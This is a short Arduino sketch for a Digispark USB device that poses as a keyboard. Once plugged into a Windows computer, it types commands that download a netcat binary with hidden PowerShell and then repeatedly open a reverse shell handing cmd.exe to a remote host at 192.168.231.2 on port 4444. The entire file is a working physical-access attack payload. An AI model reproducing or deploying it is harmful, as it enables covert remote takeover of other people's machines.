#include "DigiKeyboard.h"

#define KEY_TAB 0x2B
#define KEY_DOWN_ARROW 0x51

void setup() {
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(0);
//  setup payload  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd / & mkdir win & cd win");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe' -OutFile 'a.exe' ; for ($i=1; $i -le 1000000; $i++) {C:\\win\\a.exe 192.168.231.2 4444 -e cmd.exe}");
}

void loop() {
   DigiKeyboard.update();
}
